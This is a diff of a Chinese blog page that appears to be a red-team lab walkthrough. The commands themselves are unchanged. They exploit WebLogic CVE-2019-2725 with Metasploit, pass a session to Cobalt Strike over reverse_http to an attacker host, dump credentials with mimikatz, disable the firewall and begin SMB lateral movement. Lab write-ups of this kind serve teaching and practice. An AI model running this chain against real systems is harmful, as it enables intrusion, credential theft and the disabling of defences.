@@ -207,39 +207,39 @@
 <p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503082902329.png" alt="image-20240503082902329"></p>
 <h2 id="外网渗透"><a class="header-anchor" href="#外网渗透">¶</a>外网渗透</h2>
 <h3 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h3>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">nmap -sn 192.168.111.0/24	// 主机发现<br>nmap -sS 192.168.111.80		// 半开放扫描扫描目标端口<br>nmap -sS -Pn 192.168.111.80		// 也可以用绕过防火墙的参数<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.111.0/24	// 主机发现</span><br><span class="line">nmap -sS 192.168.111.80		// 半开放扫描扫描目标端口</span><br><span class="line">nmap -sS -Pn 192.168.111.80		// 也可以用绕过防火墙的参数</span><br></pre></td></tr></table></figure>
 <p>可以看到两台主机: 201和80, 201扫描之后没有什么东西(都开了远程桌面和445端口?)</p>
 <p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503102344954.png" alt="image-20240503102344954"></p>
 <p>7001: weblogic有着对应的扫描器, <a target="_blank" rel="noopener" href="https://github.com/rabbitmask/WeblogicScan">下载地址</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python3 WeblogicScan.py -u 192.168.111.80 -p 7001<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 WeblogicScan.py -u 192.168.111.80 -p 7001</span><br></pre></td></tr></table></figure>
 <p>有两个漏洞,我们用最新的看能不能不触发360的防护</p>
 <p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503110448745.png" alt="image-20240503110448745"></p>
 <h3 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">¶</a>漏洞利用</h3>
 <p>启动msf</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">search cve-2019-2725<br>use 0<br>set payload windows/x64/meterpreter/bind_tcp<br>set target 1<br>set lport 10000<br>set rhosts 192.168.111.80<br>run<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search cve-2019-2725</span><br><span class="line">use 0</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set target 1</span><br><span class="line">set lport 10000</span><br><span class="line">set rhosts 192.168.111.80</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503151954640.png" alt="image-20240503151954640"></p>
 <p>由于360的存在,提权不太可能如此顺利,先进入shell进行信息收集</p>
 <h2 id="内网渗透"><a class="header-anchor" href="#内网渗透">¶</a>内网渗透</h2>
 <h3 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h3>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">whoami          // de1ay\administrator<br>ipconfig /all	// 域de1ay.com, 内网地址10.10.10.80, 外网地址192.168.111.80<br>net user /domain	// 无回显<br>net user		// Administrator, de1ay, Guest<br>net config workstation 		// 计算机详细信息<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami          // de1ay\administrator</span><br><span class="line">ipconfig /all	// 域de1ay.com, 内网地址10.10.10.80, 外网地址192.168.111.80</span><br><span class="line">net user /domain	// 无回显</span><br><span class="line">net user		// Administrator, de1ay, Guest</span><br><span class="line">net config workstation 		// 计算机详细信息</span><br></pre></td></tr></table></figure>
 <p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503155126019.png" alt="image-20240503155126019"></p>
 <p>利用ping寻找域控, <code>10.10.10.10</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503163035435.png" alt="image-20240503163035435"></p>
 <h3 id="msf和cs联动"><a class="header-anchor" href="#msf和cs联动">¶</a>msf和cs联动</h3>
 <p><strong>msf-&gt;cs</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./teamserver 192.168.111.128 123456		// 启动js<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./teamserver 192.168.111.128 123456		// 启动js</span><br></pre></td></tr></table></figure>
 <p>设置监听器如下, HTTP地址和端口随意设置, 要求和前面不能占用同一个端口</p>
 <p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503153330777.png" alt="image-20240503153330777"></p>
 <p>在msf中执行如下, 成功的话就可以看见一个新的会话</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">background<br>use exploit/windows/local/payload_inject<br>set payload windows/meterpreter/reverse_http<br>set DisablePayloadHandler true<br>set lhost 192.168.111.128<br>set lport 1234<br>set session 1	// 此处session是漏洞利用后连上win7的会话<br>run<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 1234</span><br><span class="line">set session 1	// 此处session是漏洞利用后连上win7的会话</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p>会话交互,先输入<code>sleep 1</code>后立刻输入<code>shell whoami</code>等待回显, 有回显证明会话有效</p>
 <p>可以直接提权:</p>
 <p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503162727794.png" alt="image-20240503162727794"></p>
 <p>利用<code>mimikatz</code>抓密码,然后就可以在<strong>密码凭据</strong>界面看到抓到的密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">logonpasswords	// 抓明文<br>hashdump	// 抓hash<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logonpasswords	// 抓明文</span><br><span class="line">hashdump	// 抓hash</span><br></pre></td></tr></table></figure>
 <p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503163658011.png" alt="image-20240503163658011"></p>
 <p>尝试关闭防火墙, 成功, 但是似乎执行<code>net view</code>还是不可用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell netsh advfirewall set allprofiles state off<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
 <h3 id="横向移动"><a class="header-anchor" href="#横向移动">¶</a>横向移动</h3>
 <p>和红队1相同,先创建smb监听器, 我直接就叫smb</p>
 <p>我的是中文版,是右键会话选择<code>新建会话(S)</code>就可以绑定smb监听器,还是交互输入<code>spawn smb</code>好</p>
